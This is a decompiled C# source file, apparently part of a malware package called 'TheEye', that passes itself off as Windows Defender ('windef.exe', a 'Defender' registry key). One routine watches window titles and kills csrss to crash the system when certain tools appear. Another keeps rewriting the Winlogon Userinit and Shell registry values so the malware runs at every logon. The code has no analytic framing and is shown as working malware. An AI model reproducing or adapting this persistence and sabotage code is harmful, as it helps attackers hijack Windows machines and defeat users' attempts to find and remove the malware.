// Decompiled with JetBrains decompiler
// Type: EyeShield.Functions
// Assembly: windef, Version=6.1.6588.4589, Culture=neutral, PublicKeyToken=null
// MVID: D23E7A41-0614-49D4-A92C-108FD3ADE00E
// Assembly location: R:\WinBackup\Downloads\TheEye (Beta) [c0d9d by DesConnet](1)\src\Resources\windef.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Threading;
using System.Windows.Forms;

namespace EyeShield
{
  internal class Functions
  {
    public static void CheckWindowTitle(object state)
    {
      while (true)
      {
        foreach (Process process in Process.GetProcesses())
        {
          for (int index = 0; index < Vars.CriticalProcessName.Length; ++index)
          {
            if (process.MainWindowTitle.ToLower().Contains(Vars.CriticalProcessName[index]))
            {
              try
              {
                Process.GetProcessesByName("csrss")[0].Kill();
              }
              catch
              {
                Environment.Exit(-1);
              }
            }
          }
        }
        Thread.Sleep(2500);
      }
    }

    public static void StartupProtection(object state)
    {
      while (true)
      {
        RegistryKey registryKey1 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
        RegistryKey registryKey2 = registryKey1.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true);
        if (!registryKey2.GetValue("Userinit").ToString().ToLower().Contains("theeye.exe"))
        {
          RegistryKey subKey = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Defender", true);
          string str = registryKey2.GetValue("Userinit").ToString();
          registryKey2.SetValue("Userinit", (object) (str + ", " + subKey.GetValue("EyeDir").ToString()));
          subKey.Close();
          subKey.Dispose();
        }
        if (!registryKey2.GetValue("Shell").ToString().ToLower().Contains("windef.exe"))
        {
          string str = registryKey2.GetValue("Shell").ToString();
          registryKey2.SetValue("Shell", (object) (str + ", " + Application.ExecutablePath));
        }
        registryKey2.Close();
        registryKey1.Close();
        Thread.Sleep(1500);
      }
    }
  }
}
